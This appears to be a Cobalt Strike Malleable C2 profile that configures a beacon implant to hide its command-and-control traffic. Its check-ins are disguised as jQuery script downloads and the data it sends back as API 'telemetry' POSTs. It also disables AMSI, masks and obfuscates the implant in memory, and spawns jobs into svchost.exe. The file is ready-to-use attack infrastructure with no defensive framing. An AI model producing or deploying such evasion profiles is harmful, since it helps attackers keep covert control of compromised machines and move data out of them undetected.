set sleeptime "5000";
set jitter "20";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
set host_stage "false";

stage {
    set sleep_mask "true";
    set obfuscate "true";
    set userwx "false";
    set stomppe "true";
}

post-ex {
    set spawnto_x64 "%windir%\\sysnative\\svchost.exe";
    set spawnto_x86 "%windir%\\syswow64\\svchost.exe";
    set amsi_disable "true";
}

http-get {
    set uri "/updates/jquery-3.7.1.min.js /updates/assets/js/jquery.js /updates/dist/jquery.min.js";
    client {
        header "X-Beacon-Key" "infected";
        metadata {
            base64url;
            parameter "v";
        }
    }
    server {
        header "Content-Type" "application/javascript";
        output {
            print;
        }
    }
}

http-post {
    set uri "/updates/api/v2/telemetry /updates/api/collect";
    client {
        header "X-Beacon-Key" "infected";
        id {
            parameter "sid";
        }
        output {
            base64url;
            print;
        }
    }
    server {
        header "Content-Type" "application/json";
        output {
            print;
        }
    }
}
